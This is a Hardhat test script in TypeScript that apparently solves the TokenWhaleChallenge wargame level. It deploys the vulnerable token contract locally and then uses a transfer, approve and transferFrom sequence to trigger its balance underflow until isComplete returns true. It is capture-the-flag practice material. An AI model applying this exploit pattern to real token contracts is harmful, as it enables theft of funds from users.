import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers, network } from 'hardhat';
const { utils, provider } = ethers;

describe('TokenWhaleChallenge', () => {
  let target: Contract;
  let attacker: SignerWithAddress;
  let user1: SignerWithAddress;
  let user2: SignerWithAddress;

  before(async () => {
    [attacker, user1, user2] = await ethers.getSigners();

    const targetFactory = await ethers.getContractFactory('TokenWhaleChallenge');
    target = await targetFactory.deploy(attacker.address);
    await target.deployed();

    console.log('Target deployed to:', target.address);
  });

  it('Exploit', async () => {
    let tx;

    console.log('1 - Sending more than a half of the tokens to user1');
    tx = await target.connect(attacker).transfer(user1.address, 501);
    await tx.wait();

    console.log('2 - Approving transfer from attacker');
    tx = await target.connect(user1).approve(attacker.address, 501);
    await tx.wait();

    console.log('3 - Sending tokens from user1 to user2');
    tx = await target.connect(attacker).transferFrom(user1.address, user2.address, 501);
    await tx.wait();
  });

  after(async () => {
    expect(await target.isComplete()).to.equal(true);
  });
});
